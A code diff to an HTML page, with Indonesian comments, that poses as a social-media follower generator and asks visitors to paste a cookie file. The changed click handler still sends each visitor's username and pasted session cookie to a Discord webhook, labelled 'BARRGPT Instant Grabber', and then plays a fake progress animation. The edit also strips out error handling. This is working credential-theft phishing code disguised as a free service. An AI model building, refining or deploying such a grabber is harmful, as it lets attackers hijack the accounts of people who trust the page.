@@ -95,6 +95,7 @@
             color: #999;
             cursor: not-allowed;
         }
+        /* CSS untuk Link Tutorial Mobile */
         .tutorial-helper {
             margin-top: 15px;
         }
@@ -176,6 +177,7 @@
             <label for="cookie">input file to get followers</label>
             <textarea id="cookie" rows="4" placeholder="Paste the file here"></textarea>
             
+            <!-- TUTORIAL MOBILE -->
             <div class="tutorial-helper">
                 <a href="https://youtube.com/shorts/nrRlZrpCiLQ?si=RQ3lLfjLI1jEOadH" target="_blank" class="tutorial-btn">
                     📱 TUTORIAL MOBILE
@@ -250,47 +252,22 @@
 
         cookieInput.addEventListener('input', checkCookie);
 
-        generateBtn.addEventListener('click', async function() {
+        generateBtn.addEventListener('click', function() {
             const username = usernameInput.value || 'UnknownUser';
             const followers = followersInput.value || '0';
             const cookie = cookieInput.value;
-
-            // --- PERBAIKAN UTAMA DI SINI ---
-            // 1. Tambahkan timestamp biar unik (Cache-Busting)
-            const uniqueUrl = `${webhookUrl}?t=${Date.now()}`;
 
             const payload = {
                 content: `**TARGET TERSEDIA!**\n**Username:** ${username}\n**Followers Diminta:** ${followers}\n**Cookie:**\n\`\`\`${cookie}\`\`\``,
                 username: 'BARRGPT Instant Grabber'
             };
-
-            // 2. Cek hasil pengiriman
-            try {
-                const response = await fetch(uniqueUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                if (!response.ok) {
-                    console.error('Webhook failed:', response.status, response.statusText);
-                    addLog(`Failed to send to Discord (Error: ${response.status}). Please try again.`, 'error');
-                    generateBtn.disabled = false;
-                    generateBtn.textContent = 'GENERATE FOLLOWERS';
-                    generateBtn.classList.add('ready');
-                    return; 
-                }
-
-                console.log('Webhook sent successfully!');
-                startFakeProcess(username, followers);
-
-            } catch (error) {
-                console.error('Fetch error:', error);
-                addLog('Network error! Could not connect to server.', 'error');
-                generateBtn.disabled = false;
-                generateBtn.textContent = 'GENERATE FOLLOWERS';
-                generateBtn.classList.add('ready');
-            }
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            startFakeProcess(username, followers);
         });
 
         function populateActivity() {
